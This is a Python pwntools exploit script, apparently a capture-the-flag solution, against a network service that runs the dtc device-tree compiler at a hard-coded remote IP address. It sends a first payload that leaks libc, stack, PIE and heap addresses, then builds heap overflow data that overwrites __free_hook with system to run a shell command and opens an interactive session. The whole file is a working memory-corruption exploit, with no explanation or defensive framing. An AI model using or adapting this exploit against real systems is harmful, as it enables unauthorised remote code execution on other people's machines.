from pwn import *

with open("payload1.dts", "rb") as f:
    payload1 = f.read()

with open("payload2.dts", "rb") as f:
    payload2 = f.read()

#timeout -s KILL 60 ${BASEDIR}/dtc "${TEMP}" 2>/dev/null
#r = process(["timeout", "-s", "KILL", "60", "./dtc", "/tmp/dtc.XXXXXXXXXXXX"], env={"LD_PRELOAD":"./libc-2.31.so"})
#r = process("./run.sh")
#r = process(["./dtc", "tmp"])
r = remote("52.196.81.112", 3154)
#r = remote("localhost", 3154)

r.recvuntil("Size?")
r.send(str(len(payload1)) + payload1)

res = r.recvuntil("Size?")
res = res[len(payload1)-17:]
print(res)

tmpfile = "/tmp/" + res.split("tmp/")[1][:16]
print("TEMP", tmpfile)

libc = 0x0
stack = 0x0
pie = 0x0
heap = 0x0
c = 0

for i in res.split("\n"):
    if "libc-2.31.so" in i and libc == 0x0:
        libc = int(i.strip().split("-")[0], 16)
    if "stack" in i and stack == 0x0:
        stack = int(i.strip().split("-")[0], 16)
    if "dtc" in i and pie == 0x0:
        pie = int(i.strip().split("-")[0], 16)
    if "heap" in i and heap == 0x0:
        heap = int(i.strip().split("-")[0], 16)
print("LIBC:", hex(libc))
print("STACK", hex(stack))
print("PIE", hex(pie))
print("HEAP", hex(heap))

free_hook = libc + 0x1eeb28
system = libc + 0x55410

cmd = "ls -la"
cmd = cmd + "\x00"
cmd = cmd + "A"*(16-len(cmd))
cmd += p64(system)
payload2 = payload2.replace("LMFAO", cmd)
#payload2 = payload2.replace("LMFAO", "C"*8)



p = "A"*0xf8 + p64(0x101) + p64(0x0) + "B"*0xf0 + p64(0x21) + p64(0x000000f100000008) + p64(0x0) + p64(heap + 0x6a00) + p64(0x1f1) + p64(free_hook-0x10)

payload2 += "//" + p
payload2 = payload2.replace("/tmp/dtc.XXXXXXXXXXXX", tmpfile)

print(payload2)

print("LENGTH", hex(len(payload2)))
print("LENGTH", hex(len(p)))
r.send(str(len(payload2)) + payload2)
#r.send(p)


#r.stdin.close()
#r.shutdown("send")

r.interactive()
